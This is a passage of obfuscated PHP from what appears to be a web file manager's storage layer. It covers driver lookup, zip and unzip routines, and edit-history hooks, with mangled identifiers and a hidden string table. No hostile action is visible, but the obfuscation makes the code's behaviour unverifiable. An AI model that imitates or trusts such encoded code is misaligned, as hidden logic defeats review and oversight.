$²ÅÕÙ‘Û + $‡êÅ°úŞ; } if ($²¤øö†ß === !1) { $²¤øö†ß = $²ÅÕÙ‘Û - $‡êÅ°úŞ; } if ($‡êÅ°úŞ + $²¤øö†ß > $²ÅÕÙ‘Û) { $²¤øö†ß = $²ÅÕÙ‘Û - $‡êÅ°úŞ; } if (!$²ÅÕÙ‘Û && $ßşÍÅ¦->getType() == $•ŸÏê“Ì[109] && !$ßşÍÅ¦->exist($íÛ±åşš)) { $¾æ´áË = get_path_this($íÛ±åşš); $½­Ÿã· = parse_url_query($¾æ´áË); if (is_array($½­Ÿã·) && isset($½­Ÿã·[$•ŸÏê“Ì[32]])) { $¾æ´áË = urldecode($½­Ÿã·[$•ŸÏê“Ì[32]]); } throw new Exception($•ŸÏê“Ì[1267] . LNG($•ŸÏê“Ì[1268]) . $•ŸÏê“Ì[1062] . clear_html($¾æ´áË) . $•ŸÏê“Ì[12]); } if ($²¤øö†ß <= 0) { return $•ŸÏê“Ì[12]; } if ($‡êÅ°úŞ < 0 || $‡êÅ°úŞ >= $²ÅÕÙ‘Û || $²¤øö†ß > $GLOBALS[$•ŸÏê“Ì[6]][$•ŸÏê“Ì[92]][$•ŸÏê“Ì[1269]]) { throw new Exception("\x66\151\x6c\x65\x52\145\x61\x64\x20\145\x72\162\157\x72\54\157\x76\x65\x72\x20\151\157\122\x65\x61\144\115\x61\170\41\40\x73\x74\141\x72\164\75{$‡êÅ°úŞ}\73\154\x65\156\147\x74\x68\75{$²¤øö†ß}\73\40\x73\x69\x7a\x65\x3d{$²ÅÕÙ‘Û}\x3b"); } $ÔéÈœ = $ßşÍÅ¦->fileSubstr($íÛ±åşš, $‡êÅ°úŞ, $²¤øö†ß); if (!$ÔéÈœ && $²¤øö†ß && isset($GLOBALS[$•ŸÏê“Ì[1270]])) { throw new Exception($GLOBALS[$•ŸÏê“Ì[1270]][$•ŸÏê“Ì[1271]]); } return $ÔéÈœ; } private static function driverMake(&$ò¯¡ßõ¦) { $Ÿ—âßëÏ =& $_SERVER[¯‘·½]; $ŠÜØÀë = KodIO::parse($ò¯¡ßõ¦); if (!self::$driverListSystem) { $¾²˜Ø‰’ = Model($Ÿ—âßëÏ[853])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¾²˜Ø‰’, $Ÿ—âßëÏ[477]); } if ($ŠÜØÀë[$Ÿ—âßëÏ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ŠÜØÀë[$Ÿ—âßëÏ[477]]]) { throw new Exception($Ÿ—âßëÏ[1272]); return !1; } $ò¯¡ßõ¦ = $ŠÜØÀë[$Ÿ—âßëÏ[1273]]; $á©£œä = self::driverGet($ŠÜØÀë, $ò¯¡ßõ¦); return $á©£œä; } private static function driverGet($¯ˆÂœé­, &$„‚Â®à›) { $‘ ü¥¸Ê =& $_SERVER[¯‘·½]; $ãçÉ†Æ— = $¯ˆÂœé­[$‘ ü¥¸Ê[1274]]; $©©†“ßí = $¯ˆÂœé­[$‘ ü¥¸Ê[477]]; switch ($¯ˆÂœé­[$‘ ü¥¸Ê[33]]) { case KodIO::KOD_IO: $³ØæÊ“ş = self::$driverListSystem[$©©†“ßí]; break; case KodIO::KOD_SOURCE: $„‚Â®à› = $©©†“ßí . $„‚Â®à›; $³ØæÊ“ş = array($‘ ü¥¸Ê[1275] => $‘ ü¥¸Ê[1276], $‘ ü¥¸Ê[6] => $¯ˆÂœé­); $³ØæÊ“ş[$‘ ü¥¸Ê[6]][$‘ ü¥¸Ê[1277]] = $¯ˆÂœé­[$‘ ü¥¸Ê[477]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $áç·Ó»ä = $GLOBALS[$‘ ü¥¸Ê[1278]]; self::$driverListUser = array_to_keyvalue($áç·Ó»ä, $‘ ü¥¸Ê[477]); } $³ØæÊ“ş = self::$driverListUser[$©©†“ßí]; break; case KodIO::KOD_SHARE_LINK: $³ØæÊ“ş = array($‘ ü¥¸Ê[1275] => $‘ ü¥¸Ê[1279], $‘ ü¥¸Ê[6] => $¯ˆÂœé­); $îöÖ—Œ· = Action($‘ ü¥¸Ê[1280])->sharePathInfo($¯ˆÂœé­[$‘ ü¥¸Ê[87]]); $„‚Â®à› = $îöÖ—Œ·[$‘ ü¥¸Ê[194]]; if (!$îöÖ—Œ·[$‘ ü¥¸Ê[194]]) { $‘ÆşÓş = Model($‘ ü¥¸Ê[671])->getInfo($îöÖ—Œ·[$‘ ü¥¸Ê[672]]); $„‚Â®à› = KodIO::clear($‘ÆşÓş[$‘ ü¥¸Ê[1281]] . $¯ˆÂœé­[$‘ ü¥¸Ê[1273]]); $¯ˆÂœé­[$‘ ü¥¸Ê[564]] = $‘ÆşÓş; $¯ˆÂœé­[$‘ ü¥¸Ê[1254]] = $„‚Â®à›; $³ØæÊ“ş = array($‘ ü¥¸Ê[1275] => $‘ ü¥¸Ê[1282], $‘ ü¥¸Ê[6] => $¯ˆÂœé­); } else { $³ØæÊ“ş[$‘ ü¥¸Ê[6]][$‘ ü¥¸Ê[1277]] = $îöÖ—Œ·[$‘ ü¥¸Ê[194]]; } break; case KodIO::KOD_SHARE_ITEM: $³ØæÊ“ş = array($‘ ü¥¸Ê[1275] => $‘ ü¥¸Ê[1283], $‘ ü¥¸Ê[6] => $¯ˆÂœé­); $‘ÆşÓş = Model($‘ ü¥¸Ê[671])->getInfo($¯ˆÂœé­[$‘ ü¥¸Ê[477]]); if ($‘ÆşÓş[$‘ ü¥¸Ê[194]] == $‘ ü¥¸Ê[231]) { $„‚Â®à› = KodIO::clear($‘ÆşÓş[$‘ ü¥¸Ê[1281]] . $¯ˆÂœé­[$‘ ü¥¸Ê[1273]]); $¯ˆÂœé­[$‘ ü¥¸Ê[564]] = $‘ÆşÓş; $¯ˆÂœé­[$‘ ü¥¸Ê[1254]] = $„‚Â®à›; $³ØæÊ“ş = array($‘ ü¥¸Ê[1275] => $‘ ü¥¸Ê[1284], $‘ ü¥¸Ê[6] => $¯ˆÂœé­); } else { if (!$„‚Â®à›) { $„‚Â®à› = $‘ÆşÓş[$‘ ü¥¸Ê[194]]; } $³ØæÊ“ş[$‘ ü¥¸Ê[6]][$‘ ü¥¸Ê[1277]] = $‘ÆşÓş[$‘ ü¥¸Ê[194]]; } break; default: $„‚Â®à› = $¯ˆÂœé­[$‘ ü¥¸Ê[87]]; $³ØæÊ“ş = array($‘ ü¥¸Ê[1275] => $‘ ü¥¸Ê[1285]); break; } $òòÍ½„ì = $¯ˆÂœé­[$‘ ü¥¸Ê[87]]; if (!isset(self::$driverCache[$òòÍ½„ì])) { $£Ì´é‹ = strtolower($³ØæÊ“ş[$‘ ü¥¸Ê[98]]); $¿¿… = $GLOBALS[$‘ ü¥¸Ê[6]][$‘ ü¥¸Ê[92]][$‘ ü¥¸Ê[917]]; $›ç¨¯™ = $‘ ü¥¸Ê[77] . (isset($¿¿…[$£Ì´é‹]) ? $¿¿…[$£Ì´é‹] : ucfirst($£Ì´é‹)); if (!class_exists($›ç¨¯™)) { show_json("{$›ç¨¯™}\40\156\157\x74\x20\x65\x78\151\x73\164\x73\41", !1); } $—¤›Ù· = isset($³ØæÊ“ş[$‘ ü¥¸Ê[6]]) ? $³ØæÊ“ş[$‘ ü¥¸Ê[6]] : !1; self::$driverCache[$òòÍ½„ì] = new $›ç¨¯™($—¤›Ù·); } $ÌË³ŒÆÉ = self::$driverCache[$òòÍ½„ì]; $ÌË³ŒÆÉ->pathDriver = $ãçÉ†Æ—; $ÌË³ŒÆÉ->pathBase = $‘ ü¥¸Ê[12]; if (isset($³ØæÊ“ş[$‘ ü¥¸Ê[6]][$‘ ü¥¸Ê[1286]])) { $ÌË³ŒÆÉ->pathBase = rtrim($³ØæÊ“ş[$‘ ü¥¸Ê[6]][$‘ ü¥¸Ê[1286]], $‘ ü¥¸Ê[8]) . $‘ ü¥¸Ê[8]; $„‚Â®à› = $ÌË³ŒÆÉ->pathBase . ltrim($„‚Â®à›, $‘ ü¥¸Ê[8]); } $„‚Â®à› = $ÌË³ŒÆÉ->getPath($„‚Â®à›); if (isset($¯ˆÂœé­[$‘ ü¥¸Ê[1254]])) { $„‚Â®à› = $¯ˆÂœé­[$‘ ü¥¸Ê[1254]]; } $ÌË³ŒÆÉ->path = $„‚Â®à›; return $ÌË³ŒÆÉ; } public static function errorTips($—“¸Ğ»Ì = false) { $‚ÆÏ°Ò =& $_SERVER[¯‘·½]; static $À¹¥Ä¼ = array(); $åÏ±¹Í† = 1000; if ($—“¸Ğ»Ì === -1) { return $À¹¥Ä¼ ? $À¹¥Ä¼[count($À¹¥Ä¼) - 1] : $‚ÆÏ°Ò[12]; } if ($—“¸Ğ»Ì === !1) { return implode($‚ÆÏ°Ò[288], $À¹¥Ä¼); } if (count($À¹¥Ä¼) >= $åÏ±¹Í†) { $À¹¥Ä¼ = array_slice($À¹¥Ä¼, $åÏ±¹Í† * 0.5, $åÏ±¹Í†); } $À¹¥Ä¼[] = $—“¸Ğ»Ì; write_log($‚ÆÏ°Ò[176] . ACTION . $‚ÆÏ°Ò[1287] . $—“¸Ğ»Ì, $‚ÆÏ°Ò[1288]); } public static function getLastError($îÔ‚Å¿‡ = '') { $€·ëßÂ = self::errorTips(-1); return $€·ëßÂ ? $€·ëßÂ : $îÔ‚Å¿‡; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $‚Úõ•Ï—; if ($‚Úõ•Ï—) { return $‚Úõ•Ï—; } $üÍãéò = IO::init($_SERVER[¯‘·½][8]); return $üÍãéò; } private static function iconvSystem($‚Õ™ƒÇ–) { return self::local()->iconvSystem($‚Õ™ƒÇ–); } private static function iconvApp($¦üé¨‡ø) { return self::local()->iconvApp($¦üé¨‡ø); } public static function zipFolder($«ÑñÓÂà, $æÙàÌ©Ö = "\x7a\151\160", $š´Û¼ş¾ = '', $“Š†ı¡Ô = REPEAT_RENAME) { $ú£€ÌÃÃ =& $_SERVER[¯‘·½]; $Ìİ—Òı½ = IO::listPath($«ÑñÓÂà); if (!$Ìİ—Òı½) { return !1; } $Ìİ—Òı½ = array_merge($Ìİ—Òı½[$ú£€ÌÃÃ[85]], $Ìİ—Òı½[$ú£€ÌÃÃ[86]]); return self::zip($Ìİ—Òı½, $æÙàÌ©Ö, $š´Û¼ş¾, $“Š†ı¡Ô); } public static function zip($½ª´Î¬“, $êÒÆ³ªã = "\172\151\x70", $š­ÇÃ¶ = '', $’ÃĞ«¼é = REPEAT_RENAME) { $Õê¤àÌß =& $_SERVER[¯‘·½]; if (is_string($½ª´Î¬“) && $½ª´Î¬“) { $½ª´Î¬“ = array(array($Õê¤àÌß[87] => $½ª´Î¬“)); } $Ñ¶Ö¶á× = self::init($½ª´Î¬“[0][$Õê¤àÌß[87]]); $ˆºº«‡¤ = self::info($½ª´Î¬“[0][$Õê¤àÌß[87]]); $é”İû˜ = $Õê¤àÌß[12]; $Ò¤Ãœ° = $Õê¤àÌß[12]; $·¾¼°× = $Õê¤àÌß[12]; if ($š­ÇÃ¶ && substr($š­ÇÃ¶, -1, 1) != $Õê¤àÌß[8]) { $Ò¤Ãœ° = get_path_father($š­ÇÃ¶); $·¾¼°× = get_path_this($š­ÇÃ¶); } else { $Ò¤Ãœ° = self::pathFather($ˆºº«‡¤[$Õê¤àÌß[87]]); $·¾¼°× = $ˆºº«‡¤[$Õê¤àÌß[32]] . $Õê¤àÌß[10] . $êÒÆ³ªã; if (count($½ª´Î¬“) > 1) { $¦Œ´´‡Ñ = IO::info($Ò¤Ãœ°); $·¾¼°× = $¦Œ´´‡Ñ[$Õê¤àÌß[32]] . $Õê¤àÌß[10] . $êÒÆ³ªã; } if ($š­ÇÃ¶) { $Ò¤Ãœ° = $š­ÇÃ¶; } } if ($Ñ¶Ö¶á×->getType() == $Õê¤àÌß[109]) { $…‹ëå²ó = self::init($Ò¤Ãœ°); $î¯Ç‡§µ = $…‹ëå²ó->getType() == $Õê¤àÌß[109] ? $Ò¤Ãœ° : get_path_father($Ñ¶Ö¶á×->path); $î¯Ç‡§µ = IO::getPathInner($î¯Ç‡§µ); $î¯Ç‡§µ = rtrim($î¯Ç‡§µ, $Õê¤àÌß[8]) . $Õê¤àÌß[8]; mk_dir($î¯Ç‡§µ); } else { $é”İû˜ = TEMP_FILES . $Õê¤àÌß[1289] . time() . rand_string(8) . $Õê¤àÌß[8]; mk_dir($é”İû˜); file_put_contents($é”İû˜ . $Õê¤àÌß[1290], $Õê¤àÌß[12]); $î¯Ç‡§µ = $é”İû˜; } $â¥šİÌÌ = IO::info($î¯Ç‡§µ); if (!$â¥šİÌÌ || !$â¥šİÌÌ[$Õê¤àÌß[236]]) { show_json(LNG($Õê¤àÌß[1291]), !1); } $§çÑÒş¤ = self::zipFileList($½ª´Î¬“, $é”İû˜); foreach ($§çÑÒş¤ as $•ş‡­é => $€ñ²¯ïÇ) { $§çÑÒş¤[$•ş‡­é] = self::iconvSystem($€ñ²¯ïÇ); } $¼¬¶ñ›ı = get_filename_auto($î¯Ç‡§µ . $·¾¼°×, $Õê¤àÌß[12], $’ÃĞ«¼é); KodArchive::create(self::iconvSystem($¼¬¶ñ›ı), $§çÑÒş¤); if (!IO::exist($¼¬¶ñ›ı)) { if ($é”İû˜) { del_dir($é”İû˜); } write_log($Õê¤àÌß[1292] . $¼¬¶ñ›ı, $Õê¤àÌß[390]); show_json(LNG($Õê¤àÌß[1293]), !1); } if (!$é”İû˜) { return $¼¬¶ñ›ı; } $ï‰«®˜ô = self::move($¼¬¶ñ›ı, $Ò¤Ãœ°, $’ÃĞ«¼é); if ($é”İû˜) { del_dir($é”İû˜); } if (!$¼¬¶ñ›ı) { write_log($Õê¤àÌß[1294] . $¼¬¶ñ›ı . $Õê¤àÌß[1295] . $Ò¤Ãœ°, $Õê¤àÌß[390]); show_json(LNG($Õê¤àÌß[1293]), !1); } return $ï‰«®˜ô; } public static function unzip($ÉÕç’Ü, $°ûô¾¾, $Ñš¬·¶Ö = "\55\61", $àùÄéÏò = "\162\x65\160\154\x61\143\145") { $¶ëÃ¡ıß =& $_SERVER[¯‘·½]; $‰Şö†¨Ö = parent::info($ÉÕç’Ü); if (!$‰Şö†¨Ö) { show_json(LNG($¶ëÃ¡ıß[1296]), !1); } $à„ = IO::infoFullSimple($°ûô¾¾); if (!$à„) { $°ûô¾¾ = IO::mkdir($°ûô¾¾); } if (isset($à„[$¶ëÃ¡ıß[194]]) && trim($à„[$¶ëÃ¡ıß[87]], $¶ëÃ¡ıß[8]) != trim($°ûô¾¾, $¶ëÃ¡ıß[8])) { $šÛ£Ñ€û = KodIO::make($à„[$¶ëÃ¡ıß[193]]); $èÆÕñô„ = IO::fileNameAuto($šÛ£Ñ€û, $à„[$¶ëÃ¡ıß[32]], REPEAT_RENAME_FOLDER, !0); $°ûô¾¾ = IO::mkdir($šÛ£Ñ€û . $èÆÕñô„); } $Ñš¬·¶Ö = $Ñš¬·¶Ö && $Ñš¬·¶Ö != $¶ëÃ¡ıß[1297] ? @json_decode($Ñš¬·¶Ö, !0) : -1; $Õ¼à¡©¢ = self::unzipPart($ÉÕç’Ü, $Ñš¬·¶Ö); if (!$Õ¼à¡©¢ || !IO::exist($Õ¼à¡©¢[$¶ëÃ¡ıß[233]])) { show_json(LNG($¶ëÃ¡ıß[108]), !1); } $úñ¦Ø„‚ = $Õ¼à¡©¢[$¶ëÃ¡ıß[1298]][count($Õ¼à¡©¢[$¶ëÃ¡ıß[1298]]) - 1]; if ($úñ¦Ø„‚[$¶ëÃ¡ıß[1299]] == -1 || substr($úñ¦Ø„‚[$¶ëÃ¡ıß[32]], -1, 1) == $¶ëÃ¡ıß[8]) { $ö‚ä¸˜Š = $Õ¼à¡©¢[$¶ëÃ¡ıß[1300]] . rand_string(10) . $¶ëÃ¡ıß[8]; mk_dir($ö‚ä¸˜Š); $Ì—†Õ¾ = count($Õ¼à¡©¢[$¶ëÃ¡ıß[1298]]) == 1 ? IO::ext($ÉÕç’Ü) : get_path_ext($Õ¼à¡©¢[$¶ëÃ¡ıß[233]]); $ÕÊ¾¹Üù = KodArchive::extract(self::iconvSystem($Õ¼à¡©¢[$¶ëÃ¡ıß[233]]), $ö‚ä¸˜Š, $úñ¦Ø„‚[$¶ëÃ¡ıß[1299]], $èÆÕñô„, $Ì—†Õ¾); self::unzipErrorCheck($ÕÊ¾¹Üù, array($¶ëÃ¡ıß[1301], $ÉÕç’Ü, $Ì—†Õ¾, $°ûô¾¾, $Õ¼à¡©¢)); Hook::trigger($¶ëÃ¡ıß[1302], $ö‚ä¸˜Š); recursion_dir($ö‚ä¸˜Š, $úÍşÂ‘Ô, $éÕÛßŒ¯, 0); $ì‡íô¸– = array_merge($úÍşÂ‘Ô, $éÕÛßŒ¯); $šãóËîÄ = array(); foreach ($ì‡íô¸– as $Ü˜¦ÌèÊ) { $äßÅÏÖÀ = IO::move(self::iconvApp($Ü˜¦ÌèÊ), $°ûô¾¾, $àùÄéÏò); if ($äßÅÏÖÀ) { $šãóËîÄ[] = $äßÅÏÖÀ; } } del_dir($ö‚ä¸˜Š); } else { $äßÅÏÖÀ = IO::move($Õ¼à¡©¢[$¶ëÃ¡ıß[233]], $°ûô¾¾, $àùÄéÏò, get_path_this($úñ¦Ø„‚[$¶ëÃ¡ıß[32]])); if ($äßÅÏÖÀ) { $šãóËîÄ[] = $äßÅÏÖÀ; } } return $šãóËîÄ ? $šãóËîÄ : !1; } public static function unzipList($ƒé† ÚÌ) { $Éí½ƒ¾â =& $_SERVER[¯‘·½]; $·ç¡ØÃ² = isset($ƒé† ÚÌ[$Éí½ƒ¾â[1303]]) ? $ƒé† ÚÌ[$Éí½ƒ¾â[1303]] : !1; $ä”î¯û¸ = isset($ƒé† ÚÌ[$Éí½ƒ¾â[1299]]) ? @json_decode($ƒé† ÚÌ[$Éí½ƒ¾â[1299]], !0) : -1; $Û§ôƒÛĞ = self::unzipPart($ƒé† ÚÌ[$Éí½ƒ¾â[87]], $ä”î¯û¸); if (!$Û§ôƒÛĞ || !IO::exist($Û§ôƒÛĞ[$Éí½ƒ¾â[233]])) { show_json(LNG($Éí½ƒ¾â[108]), !1); } $ŒÓªâ£ú = $Û§ôƒÛĞ[$Éí½ƒ¾â[1298]][count($Û§ôƒÛĞ[$Éí½ƒ¾â[1298]]) - 1]; $Üñº‡×È = in_array(IO::ext($Û§ôƒÛĞ[$Éí½ƒ¾â[233]]), array($Éí½ƒ¾â[390], $Éí½ƒ¾â[1304], $Éí½ƒ¾â[1305], $Éí½ƒ¾â[1306], $Éí½ƒ¾â[1307], $Éí½ƒ¾â[1308])); if (!$·ç¡ØÃ² && ($ŒÓªâ£ú[$Éí½ƒ¾â[1299]] == -1 || $Üñº‡×È)) { $Ñ®â£¯² = $Û§ôƒÛĞ[$Éí½ƒ¾â[1300]] . get_path_this($Û§ôƒÛĞ[$Éí½ƒ¾â[233]]) . $Éí½ƒ¾â[1309]; if (!IO::exist($Ñ®â£¯²)) { $¶«ÕÔ = $ŒÓªâ£ú[$Éí½ƒ¾â[1299]] == -1 ? get_path_ext(IO::pathThis($ƒé† ÚÌ[$Éí½ƒ¾â[87]])) : get_path_ext($Û§ôƒÛĞ[$Éí½ƒ¾â[233]]); $Û—ªñ†† = KodArchive::listContent(self::iconvSystem($Û§ôƒÛĞ[$Éí½ƒ¾â[233]]), !0, $¶«ÕÔ); self::unzipErrorCheck($Û—ªñ††, array($Éí½ƒ¾â[1310], $ƒé† ÚÌ, $Û§ôƒÛĞ)); @file_put_contents($Ñ®â£¯², json_encode($Û—ªñ††[$Éí½ƒ¾â[1311]])); } return @json_decode(IO::getContent($Ñ®â£¯²), !0); } IO::fileOut($Û§ôƒÛĞ[$Éí½ƒ¾â[233]], $·ç¡ØÃ², get_path_this($ŒÓªâ£ú[$Éí½ƒ¾â[32]])); die; } private static function zipFileList($¦›úğÕ¤, $±°§ìèâ = false) { $Ãñ±àÕ¹ =& $_SERVER[¯‘·½]; $»µ¥ã«¹ = array(); foreach ($¦›úğÕ¤ as $©Üíˆ¥Ø) { $ìŠÙÜâƒ = $©Üíˆ¥Ø[$Ãñ±àÕ¹[87]]; if ($±°§ìèâ) { $ìŠÙÜâƒ = self::copy($©Üíˆ¥Ø[$Ãñ±àÕ¹[87]], $±°§ìèâ, $Ãñ±àÕ¹[910]); } else { $ÉøÕˆÍ† = self::init($©Üíˆ¥Ø[$Ãñ±àÕ¹[87]]); if ($ÉøÕˆÍ†->getType() == $Ãñ±àÕ¹[109]) { $ìŠÙÜâƒ = $ÉøÕˆÍ†->path; } } if ($ìŠÙÜâƒ && self::local()->exist($ìŠÙÜâƒ)) { $»µ¥ã«¹[$©Üíˆ¥Ø[$Ãñ±àÕ¹[87]]] = $ìŠÙÜâƒ; } } if (!empty($»µ¥ã«¹)) { return array_values($»µ¥ã«¹); } show_json(LNG($Ãñ±àÕ¹[1268]), !1); } private static function localFilePath($Ö‰“•¢) { $²ôñû˜¦ =& $_SERVER[¯‘·½]; $õÛîõ›® = KodIO::parse($Ö‰“•¢); if ($õÛîõ›®[$²ôñû˜¦[33]] == KodIO::KOD_SOURCE) { $­ÎÚ’Î… = Model($²ôñû˜¦[916])->fileInfoGet(KodIO::sourceID($Ö‰“•¢)); if (!$­ÎÚ’Î…[$²ôñû˜¦[87]]) { show_json($²ôñû˜¦[1312], !1); } $Ö‰“•¢ = $­ÎÚ’Î…[$²ôñû˜¦[87]]; } $·¬œÓ×™ = self::init($Ö‰“•¢); if ($·¬œÓ×™->pathParse[$²ôñû˜¦[1254]]) { $Ö‰“•¢ = $·¬œÓ×™->pathParse[$²ôñû˜¦[1254]]; $·¬œÓ×™ = self::init($Ö‰“•¢); } $Ç´–°…Ã = $·¬œÓ×™->getType(); if ($Ç´–°…Ã == $²ôñû˜¦[109] || $Ç´–°…Ã == $²ôñû˜¦[1313]) { if (!$·¬œÓ×™->exist($·¬œÓ×™->path)) { show_json(LNG($²ôñû˜¦[108]), !1); } return $·¬œÓ×™->path; } return !1; } public static function unzipPart($Ç–¬ÇÇ, $úéö¥şé = -1) { $ÆëãÒÇ¤ =& $_SERVER[¯‘·½]; $øëˆ½­ï = IO::pathThis($Ç–¬ÇÇ); if (!$úéö¥şé || $úéö¥şé == -1) { $û†„ö¾± = array(array($ÆëãÒÇ¤[32] => $øëˆ½­ï, $ÆëãÒÇ¤[1299] => -1)); $û†„ö¾±[0][$ÆëãÒÇ¤[1314]] = $û†„ö¾±[0][$ÆëãÒÇ¤[32]]; } else { if (is_array($úéö¥şé)) { $û†„ö¾± = $úéö¥şé; $Ï„„¦àª = count($û†„ö¾±) - 1; for ($ŠüÒµŸå = 0; $ŠüÒµŸå <= $Ï„„¦àª; $ŠüÒµŸå++) { $„¿„ò‰ú = $û†„ö¾±[$ŠüÒµŸå]; $‡ä†¡ç = get_path_this($„¿„ò‰ú[$ÆëãÒÇ¤[32]]) . (checkExtSafe($„¿„ò‰ú[$ÆëãÒÇ¤[32]]) ? $ÆëãÒÇ¤[12] : $ÆëãÒÇ¤[1315]); $û†„ö¾±[$ŠüÒµŸå][$ÆëãÒÇ¤[1314]] = $ÆëãÒÇ¤[1316] . intval($„¿„ò‰ú[$ÆëãÒÇ¤[1299]]) . $ÆëãÒÇ¤[464] . $‡ä†¡ç; if ($ŠüÒµŸå == 0) { continue; } $û†„ö¾±[$ŠüÒµŸå][$ÆëãÒÇ¤[1314]] = $û†„ö¾±[$ŠüÒµŸå - 1][$ÆëãÒÇ¤[1314]] . $ÆëãÒÇ¤[1317] . $û†„ö¾±[$ŠüÒµŸå][$ÆëãÒÇ¤[1314]]; } } } if (!is_array($û†„ö¾±) || count($û†„ö¾±) == 0) { return !1; } $ƒìõêÜˆ = $û†„ö¾±[count($û†„ö¾±) - 1]; if (!IO::exist($Ç–¬ÇÇ)) { return !1; } $Õ•†çåº = TEMP_FILES . $ÆëãÒÇ¤[1318] . kodIO::hashPathSafe($Ç–¬ÇÇ) . $ÆëãÒÇ¤[8]; $ÚÄÑ•¨È = $Õ•†çåº . $ƒìõêÜˆ[$ÆëãÒÇ¤[1314]]; mk_dir($Õ•†çåº); file_put_contents(TEMP_FILES . $ÆëãÒÇ¤[1290], $ÆëãÒÇ¤[12]); if (IO::exist($ÚÄÑ•¨È)) { return array($ÆëãÒÇ¤[233] => $ÚÄÑ•¨È, $ÆëãÒÇ¤[1298] => $û†„ö¾±, $ÆëãÒÇ¤[1300] => $Õ•†çåº); } $¹Å×”Ò™ = self::localFilePath($Ç–¬ÇÇ); if (!$¹Å×”Ò™) { $¹Å×”Ò™ = $Õ•†çåº . $ÆëãÒÇ¤[1319]; if (!IO::exist($¹Å×”Ò™)) { self::copy($Ç–¬ÇÇ, $Õ•†çåº, !1, get_path_this($¹Å×”Ò™)); } } if (!$¹Å×”Ò™ || !IO::exist($¹Å×”Ò™)) { return !1; } if ($ƒìõêÜˆ[$ÆëãÒÇ¤[1299]] == -1) { return array($ÆëãÒÇ¤[233] => $¹Å×”Ò™, $ÆëãÒÇ¤[1298] => $û†„ö¾±, $ÆëãÒÇ¤[1300] => $Õ•†çåº); } $´ÏˆÃÆ› = $¹Å×”Ò™; foreach ($û†„ö¾± as $ŠüÒµŸå => $„¿„ò‰ú) { if (!$„¿„ò‰ú || $„¿„ò‰ú[$ÆëãÒÇ¤[1299]] == $ÆëãÒÇ¤[1297]) { break; } if (substr($„¿„ò‰ú[$ÆëãÒÇ¤[32]], -1, 1) == $ÆëãÒÇ¤[8]) { break; } $¤İÊ˜†  = in_array(get_path_ext($„¿„ò‰ú[$ÆëãÒÇ¤[1314]]), array($ÆëãÒÇ¤[390], $ÆëãÒÇ¤[1304], $ÆëãÒÇ¤[1305], $ÆëãÒÇ¤[1306], $ÆëãÒÇ¤[1307], $ÆëãÒÇ¤[1308])); $ÍèõË­ = $ŠüÒµŸå == count($û†„ö¾±) - 1 && $¤İÊ˜† ; $•ªá‚Œ = $Õ•†çåº . $„¿„ò‰ú[$ÆëãÒÇ¤[1314]]; $ŸÊ‡›ş = $Õ•†çåº . get_path_this($„¿„ò‰ú[$ÆëãÒÇ¤[32]]); if (IO::exist($•ªá‚Œ)) { $´ÏˆÃÆ› = $•ªá‚Œ; continue; } $¦àŸõÏ» = $ŠüÒµŸå == 0 ? get_path_ext($øëˆ½­ï) : get_path_ext($´ÏˆÃÆ›); $ğà¾¼–É = KodArchive::extract(self::iconvSystem($´ÏˆÃÆ›), $Õ•†çåº, $„¿„ò‰ú[$ÆëãÒÇ¤[1299]], $šĞ³©Ù, $¦àŸõÏ»); self::unzipErrorCheck($ğà¾¼–É, array($ÆëãÒÇ¤[1320], $Ç–¬ÇÇ, $û†„ö¾±, $„¿„ò‰ú, $•ªá‚Œ)); if (IO::exist($ŸÊ‡›ş)) { IO::rename($ŸÊ‡›ş, get_path_this($•ªá‚Œ)); } $´ÏˆÃÆ› = $•ªá‚Œ; } $ÚÄÑ•¨È = $´ÏˆÃÆ›; return array($ÆëãÒÇ¤[233] => $´ÏˆÃÆ›, $ÆëãÒÇ¤[1298] => $û†„ö¾±, $ÆëãÒÇ¤[1300] => $Õ•†çåº); } private static function unzipErrorCheck($¯Ò‚œï, $Ü¹¢¹‚ = false) { $Ê±£Üä =& $_SERVER[¯‘·½]; if ($¯Ò‚œï[$Ê±£Üä[1321]]) { return !0; } write_log(array($Ê±£Üä[1322], $¯Ò‚œï, $Ü¹¢¹‚), $Ê±£Üä[1323]); $‘¥×ƒŸÉ = is_array($¯Ò‚œï[$Ê±£Üä[1311]]) ? json_encode($¯Ò‚œï[$Ê±£Üä[1311]]) : $¯Ò‚œï[$Ê±£Üä[1311]]; show_json($Ê±£Üä[1324] . $‘¥×ƒŸÉ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¬î­ç—€ =& $_SERVER[¯‘·½]; $ü´µŸ¦° = $GLOBALS[$¬î­ç—€[6]][$¬î­ç—€[92]]; if ($ü´µŸ¦°[$¬î­ç—€[1325]] != 1) { return; } if ($ü´µŸ¦°[$¬î­ç—€[1326]] <= 0) { return; } if (isset($_REQUEST[$¬î­ç—€[1327]]) && $_REQUEST[$¬î­ç—€[1327]] == $¬î­ç—€[91]) { return; } Hook::bind($¬î­ç—€[1328], $¬î­ç—€[1329]); Hook::bind($¬î­ç—€[1330], $¬î­ç—€[1331]); Hook::bind($¬î­ç—€[1332], $¬î­ç—€[1333]); Hook::bind($¬î­ç—€[1334], $¬î­ç—€[1335]); Hook::bind($¬î­ç—€[1336], $¬î­ç—€[1337]); Hook::bind($¬î­ç—€[1338], $¬î­ç—€[1339]); } public static function eventBeforeUpload($ò”˜şõÆ) { if ($ò”˜şõÆ[3] && $ò”˜şõÆ[3] != REPEAT_REPLACE) { return; } $ú¤Ô°Ú  = self::parsePath($ò”˜şõÆ[0]); if (!$ú¤Ô°Ú ) { return; } self::add($ú¤Ô°Ú ); } public static function eventBeforeEdit($°ÁÊ˜¤) { $¬ ÎóÉÂ = self::parsePath($°ÁÊ˜¤[0]); if (!$¬ ÎóÉÂ) { return; } self::add($¬ ÎóÉÂ); } public static function eventBeforeCopyFile($ó¨ŸĞ˜ , $•ÎÊÇÒÑ, $¬»™Õ²Ä, $Ğàı©€ä, $ÃË¡é¾°, $’Ãšçú¦) { $Ïúüçî =& $_SERVER[¯‘·½]; if (isset($¬»™Õ²Ä->_data[$Ïúüçî[1258]]) && $¬»™Õ²Ä->_data[$Ïúüçî[1258]]) { return; } $‚ ÷ÆÁÁ = $¬»™Õ²Ä->getPathOuter($Ğàı©€ä); $ÆíÎŠÍ = self::parsePath($‚ ÷ÆÁÁ); if (!$ÆíÎŠÍ) { return; } self::add($ÆíÎŠÍ); } public static function 